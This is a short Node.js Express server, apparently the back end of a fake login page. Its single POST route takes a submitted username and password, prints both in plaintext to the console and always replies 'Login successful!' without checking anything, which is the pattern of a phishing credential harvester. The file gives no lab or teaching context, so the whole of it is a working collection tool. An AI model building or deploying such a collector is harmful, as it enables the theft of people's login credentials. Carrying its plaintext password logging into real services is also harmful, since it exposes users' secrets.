const express = require('express');
const bodyParser = require('body-parser');
const chalk = require('chalk'); // Import the chalk library

// Create an Express app
const app = express();

// Use body-parser middleware to parse POST request bodies
app.use(bodyParser.urlencoded({ extended: true }));

// Define the POST route to receive the form data
app.post('/', (req, res) => {
    // Get the credentials from the request body
    const { username, password } = req.body;
    
    // Log the credentials in green
    console.log(chalk.green(`Received credentials: Username: ${username}, Password: ${password}`));
    
    // Respond with a success message
    res.send('Login successful!');
});

// Set the port the server will listen to
const port = 3000;
app.listen(port, () => {
    console.log(`Server is running on http://10.0.1.33:${port}`);
});
